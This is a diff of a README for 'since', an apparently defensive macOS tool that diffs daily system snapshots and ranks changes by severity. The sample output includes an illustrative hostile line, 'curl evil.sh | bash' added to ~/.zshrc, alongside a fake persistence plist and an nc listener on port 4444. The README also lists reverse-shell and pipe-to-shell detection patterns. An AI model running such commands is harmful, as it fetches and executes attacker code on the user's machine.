@@ -1,61 +1,72 @@
 # since
 
-**A plain-language daily diff of your Mac.** One command that answers:
+**A plain-language daily diff of your computer.** One command that answers:
 
-> *What's different about my computer since I last looked?*
+> *What's different about my machine since I last looked?*
 
-`since` snapshots the things that quietly change under you and shows you the delta in
-human language — great for catching **both** malware persistence **and** your own
-forgotten `brew install` from three weeks ago.
+`since` snapshots the things that quietly change under you, then shows you the delta
+in human language — **ranked by how much you should care**, with *why* each change
+probably happened and the command to undo it. Great for catching **both** malware
+persistence **and** your own forgotten `brew install` from three weeks ago.
 
 ```
-since — what changed on this Mac
+since — what changed on this computer
 baseline Thu 23 Jul 09:00  →  now Fri 24 Jul 09:00   (about 25 hours)
 
-⚠  Worth a look
-   • NEW login items: SketchyHelper
-   • NEW startup/background jobs: ~/Library/LaunchAgents/com.evil.persist.plist
-   • NEW listening network services: nc listening on port(s) 4444
-   • EDITED: ~/.zshrc
-
-System files
-   ~/.zshrc (edited)
+🚨 Worth a look — right now
+  🔴 /etc/hosts (edited)
+      why: redirects a real domain (hosts)
+      +0.0.0.0 www.apple.com
+  🔴 ~/.zshrc (edited)
+      why: pipes a download straight into a shell
       +curl evil.sh | bash
+  🔴 NEW startup/background jobs: ~/Library/LaunchAgents/com.evil.persist.plist
+      signature: unsigned
+      undo: launchctl bootout gui/$UID '…/com.evil.persist.plist'; rm '…'
+  🟠 NEW listener: nc on port(s) 4444
+  🟠 NEW login items: SketchyHelper
+      undo: osascript -e 'tell application "System Events" to delete login item "SketchyHelper"'
 
-Homebrew packages
-   + installed  fzf 0.54
-   ~ changed    jq 1.6 → 1.7
-   - removed    cowsay 3.04
+Software
+  + installed  fzf 0.54   (from: brew install fzf)
+  ~ updated    jq 1.6 → 1.7
 
-Big new files
-      1.4 GB  ~/Downloads/ubuntu.iso
-   (visible folders only — hidden/app-data dirs like ~/Library are skipped)
+Disk — big new files
+     1.4 GB  ~/Downloads/ubuntu.iso
 ```
+
+## Severity, at a glance
+
+Every change is ranked so real signal doesn't drown in routine noise:
+
+| | Level | Examples |
+|---|---|---|
+| 🔴 | **critical** | unsigned startup item · new kernel extension · `curl \| bash` in a shell rc · a hosts-file redirect of a real domain |
+| 🟠 | **notable** | new login item · new listening process · new browser extension · DNS/proxy change · edited system file |
+| 🟡 | **minor** | a startup plist was modified · a persistence item was removed |
+| ⚪ | **info** | software upgrades/removals · big new files |
 
 ## What it watches
 
-| Category | What & why |
-|---|---|
-| **Login items** | "Open at Login" apps — a classic persistence spot |
-| **Startup/background jobs** | LaunchAgents & LaunchDaemons (new *or modified* plists) |
-| **Listening network services** | Processes accepting TCP connections — a new one is the signal (a reverse shell, an unexpected server) |
-| **System extensions** | Third-party network filters / endpoint agents |
-| **System files** | `~/.zshrc` & friends, `/etc/hosts`, cron — shown as an actual line-level diff |
-| **Homebrew / npm / Applications** | What software came and went |
-| **Big new files** | Biggest files created since the baseline, in your visible folders |
+- **Persistence** — login items, LaunchAgents/Daemons (new *or modified*), kernel
+  extensions, system extensions, browser extensions.
+- **Network** — listening services (keyed by process), DNS servers & proxy settings.
+  Outbound connections are tracked too but hidden by default (`--all`) — they're too
+  churny to be a daily signal.
+- **Software** — Homebrew, npm-global, pip, `/Applications`, Mac App Store.
+- **System files** — shell rc files, `/etc/hosts`, cron, `sshd_config`, `sudoers`,
+  `~/.ssh/*`, and more — shown as an actual **line-level diff**.
+- **Disk** — biggest new files and fastest-growing folders in your visible locations.
 
-## Design choices worth knowing
+## Smart bits
 
-- **Listening services are keyed by process, not port.** Daemons like `rapportd`
-  rebind random high ports every boot; keying by port would cry wolf daily. A
-  genuinely *new listening process* is what surfaces.
-- **Big-file scan skips hidden/app-data dirs** (`~/Library`, `.git`, `.cache`,
-  VM disk images, LLM transcripts…). It looks where *you* put files. This is
-  stated in the output, not hidden.
-- **Zero dependencies, no sudo.** Pure Python 3 stdlib + macOS tools.
-- **Your snapshots stay private.** They live in `~/.local/state/since/`
-  (mode `600`), never in this repo. They describe your machine — treat them
-  as sensitive.
+- **Signing/trust check** — new startup programs & apps are run through `codesign`/
+  `spctl`; an *unsigned* one gets bumped to 🔴.
+- **Attribution ("why")** — correlates a new package with your shell history, so you
+  see *"fzf — from: `brew install fzf`"* instead of an anonymous list.
+- **Undo hints** — the reversal command for anything reversible it flags.
+- **Malicious-pattern detection** — recognises `curl|bash`, base64-pipe-to-shell,
+  netcat reverse shells, and hosts redirects, and escalates them to 🔴.
 
 ## Install
 
@@ -63,39 +74,65 @@ Big new files
 ./install.sh
 ```
 
-This symlinks `since` into `~/.local/bin` and offers to install a daily
-LaunchAgent that takes a snapshot every morning — which is what makes
-"since yesterday" meaningful. (Make sure `~/.local/bin` is on your `PATH`.)
+Symlinks `since` into `~/.local/bin` and offers a daily LaunchAgent that runs
+`since digest --notify` each morning — a **desktop notification** whenever something's
+worth a look. (Make sure `~/.local/bin` is on your `PATH`.)
 
-## Usage
+## Commands
 
 ```sh
-since                 # diff live state vs the most recent snapshot, then save one
-since --since 1d      # diff against the newest snapshot at least 1 day old
-since --since 7d      # "what changed this week"
-since --no-save       # peek without saving a new snapshot
-since snapshot        # just capture a snapshot (this is what the daily job runs)
-since list            # list saved snapshots
-since --json          # machine-readable diff
+since                    # diff vs the most recent snapshot, then save one
+since --since 1d         # by duration
+since --since yesterday  # or natural language: "monday", "3 hours ago", "a week ago"
+since --since clean      # or a named checkpoint (see `mark`)
+since --all              # also show the noisy outbound-connection churn
+
+since mark clean-slate   # save a named checkpoint of right now
+since ack                # mark current state as normal — start fresh from here
+since ignore 'listening:com.docker*'   # stop alerting on known-noisy things
+since ignore --list
+
+since snapshot           # capture only (what the daily job runs)
+since digest --notify    # diff + desktop notification if 🟠 or worse
+since list               # list saved snapshots (labels shown)
+since --json             # machine-readable, with a max_level field
 ```
 
-**First run** establishes a baseline (nothing to compare yet). Run it again after
-installing something, or tomorrow, to see the diff.
+**First run** establishes a baseline. Run it again later to see the diff.
 
-## How it decides "changed"
+## Noise control
 
-Each snapshot is a JSON fingerprint per category. A diff is added / removed /
-changed keys. For system files it stores the text and shows a real `diff`, so you
-see the exact line someone (or something) added to your `~/.zshrc`.
+- **Listening services are keyed by process, not port** — daemons that rebind random
+  high ports every boot won't cry wolf. A *new listening process* is the signal.
+- **Big-file scan skips hidden/app-data dirs** (`~/Library`, `.git`, VM disks, LLM
+  transcripts…) — it looks where *you* put files. Stated in the output, not hidden.
+- **`ignore` rules** and **`ack`** let the digest get quieter and more meaningful over time.
+
+## Design & internals
+
+Zero dependencies (Python 3 stdlib + OS tools), no sudo. Each snapshot is a JSON
+fingerprint per category; a diff is added/removed/changed keys, enriched with severity,
+signing, attribution and undo. Collectors are **platform-abstracted** — a common schema
+fed by per-OS backends.
+
+Your snapshots stay private in `~/.local/state/since/` (mode `600`), never in this repo.
+They describe your machine — treat them as sensitive.
+
+## Platform support
+
+- **macOS** — fully supported and verified.
+- **Linux** — the collector layer is abstracted for it, but Linux backends (systemd,
+  apt/dnf/pacman, `ss`, `~/.config/autostart`, `notify-send`) are **not implemented yet**;
+  they'll be added and verified on a real Linux box. See `PENDING.md`. On Linux today it
+  degrades gracefully (a couple of shared collectors, no crash).
 
 ## Limitations (honest ones)
 
-- Login items via `System Events` cover the modern "Open at Login" list; the full
-  Background Task Management database (`sfltool dumpbtm`) needs `sudo` and isn't
-  read yet — see `PENDING.md`.
-- Only TCP listeners are tracked (not UDP). New listening *ports* on an
-  already-known process are intentionally not flagged.
-- The big-file scan is bounded (visible dirs, `> 25 MB`); it is not a full disk audit.
+- Login items use the `System Events` "Open at Login" list; the full Background Task
+  Management DB (`sfltool dumpbtm`) needs `sudo` and isn't read yet.
+- Only TCP listeners are tracked (not UDP). New ports on an already-known process aren't flagged.
+- Signing check covers startup programs & apps, not live listeners (the process may differ by diff time).
+- The big-file scan is bounded (visible dirs, `> 25 MB`) — not a full disk audit.
 
-Not a replacement for a real EDR/antivirus — it's a **friendly daily awareness
-tool** that makes silent changes visible.
+Not a replacement for real EDR/antivirus — a **friendly daily awareness tool** that makes
+silent changes visible.
